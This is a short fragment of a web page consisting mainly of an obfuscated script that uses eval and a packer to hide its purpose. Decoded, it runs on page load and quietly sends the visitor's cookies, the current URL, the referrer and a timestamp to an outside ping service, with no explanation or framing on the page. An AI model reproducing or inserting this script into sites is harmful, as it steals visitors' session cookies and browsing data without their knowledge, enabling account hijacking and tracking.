...
<script type="text/javascript">
  ...
  eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('(2(){3("4://5-6.7/8-9-a-b-d",{e:"f",g:"h-i",j:k.l({u:m.n,r:1.o,c:1.p,t:q.s(),}),v:!0,})})();',32,32,'|document|function|fetch|https|hc|ping|com|35485c32|542a|4a66|bacf||d213e9c424d9|method|POST|mode|no|cors|body|JSON|stringify|location|href|referrer|cookie|Date||now|||keepalive'.split('|'),0,{}))
</script>